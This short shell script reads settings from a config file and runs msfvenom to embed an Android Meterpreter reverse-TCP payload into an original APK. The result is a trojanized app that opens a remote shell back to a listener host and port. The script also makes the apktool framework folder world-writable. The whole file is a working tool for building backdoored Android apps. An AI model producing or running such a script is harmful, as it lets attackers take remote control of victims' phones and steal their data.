#!/bin/sh

sudo mkdir -p ~/.local/share/apktool/framework
sudo chmod 777 ~/.local/share/apktool/framework

source config_payload.ini

sudo msfvenom -x ${Original} -p android/meterpreter/reverse_tcp LHOST=${Listen_Host} LPORT=${Listen_Port} R > ${Payload}

sudo chmod +x ${Payload}
